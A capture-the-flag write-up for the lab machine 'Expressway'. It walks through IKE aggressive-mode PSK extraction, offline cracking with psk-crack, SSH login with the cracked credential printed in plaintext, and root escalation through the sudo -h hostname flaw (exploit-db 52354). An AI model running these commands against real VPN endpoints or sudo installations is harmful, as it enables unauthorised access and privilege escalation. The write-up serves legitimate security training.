---
title: Expressway
date: 2025-10-30
description: Easy Linux machine hiding its attack surface behind UDP — an IKE/IPsec endpoint leaking a crackable PSK hash through Aggressive Mode, reused as SSH credentials, with privilege escalation via sudo hostname impersonation against an internal host.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

A UDP sweep surfaced the actual attack surface — ISAKMP on `500/udp` alongside TFTP and NAT-T:

```bash 
# Nmap 7.95 scan initiated Wed Oct 29 18:13:14 2025 as: /usr/lib/nmap/nmap -sU -sV -F -open -oN udp_scan_results.txt 10.10.11.87
Nmap scan report for expressway.htb (10.10.11.87)
Host is up (0.50s latency).
Not shown: 96 closed udp ports (port-unreach)
PORT     STATE         SERVICE   VERSION
68/udp   open|filtered dhcpc
69/udp   open          tftp      Netkit tftpd or atftpd
500/udp  open          isakmp?
4500/udp open|filtered nat-t-ike
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port500-UDP:V=7.95%I=7%D=10/29%Time=69020C68%P=aarch64-unknown-linux-gn
SF:u%r(IKE_MAIN_MODE,70,"\0\x11\"3DUfw\xcd\xb4\xa7\x83A\xa8\x86#\x01\x10\x
SF:02\0\0\0\0\0\0\0\0p\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\
SF:0\0\0\x20\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03
SF:\0\x01\x80\x0b\0\x01\x80\x0c\0\x01\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\0
SF:\0\0\x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0")%r(IPSEC_ST
SF:ART,9C,"1'\xfc\xb08\x10\x9e\x89\?S\xbcLE\x9c\x9a\xbc\x01\x10\x02\0\0\0\
SF:0\0\0\0\0\x9c\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\
SF:x20\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x03
SF:\x80\x0b\0\x01\x80\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0\0
SF:\x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0\x18@H\xb7\
SF:xd5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\x14\x90\xcb
SF:\x80\x91>\xbbin\x08c\x81\xb5\xecB{\x1f");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 29 18:17:10 2025 -- 1 IP address (1 host up) scanned in 235.74 seconds
```
IKE on `500/udp` handles security association negotiation through ISAKMP — the standard framework for IPsec VPN key and authentication exchange.

## ike-scan

```bash
ike-scan -M expressway.htb
```

The target accepted the proposal with a valid transform:

- `Enc=3DES` · `Hash=SHA1` · `Group=2 (modp1024)` · `Auth=PSK`
- `LifeDuration=28800` seconds
- Extended features: `XAUTH` and `Dead Peer Detection`

The **PSK** authentication method confirmed a pre-shared key was in play — a promising target for offline cracking — and one handshake returned with zero notifies, meaning the transform was valid.

## Aggressive Mode Extraction

Next, Aggressive Mode was triggered to leak the identity and handshake hash before authentication:

```bash
ike-scan -P -M -A -n fakeID expressway.htb
```

The handshake captured the full cracking context — PSK, nonces, cookies, DH public values, and the initiator ID. This is why specialized tooling matters here:

| Tool        | Designed For                   | Result                              |
| ----------- | ------------------------------ | ----------------------------------- |
| `john`      | Raw password hashes            | Failed — hash wasn't raw             |
| `psk-crack` | IKE Aggressive Mode PSK hashes | Worked — used full handshake context |

## Cracking

```bash
psk-crack handshake.txt -d /usr/share/wordlists/rockyou.txt
```

# User

The cracked PSK doubled as the SSH password for the `ike` account:

```text
ike : freakingrockstarontheroad
```

# Root

`linpeas` flagged two interesting findings — membership in the `proxy` group and a sudo binary installed at `/usr/local/bin/sudo`.

The `proxy` group granted access to Squid logs. Digging through `/var/log/sqid/access.log.1` surfaced an internal hostname:

```bash
cat access.log.1 | grep htb
```

```text
offramp.expressway.htb
```

Checking the sudo version:

```bash
sudo -V
Sudo version 1.9.17
```

Research identified **exploit-db 52354**: sudo's `-h` flag can be abused to impersonate another hostname and inherit its sudoers policy. The `offramp` host held `NOPASSWD: ALL` for `ike`.

Following the exploit steps:

```bash
sudo -l -h offramp.expressway.htb
```

```bash
sudo -h offramp.expressway.htb -i
```

Gained `root`
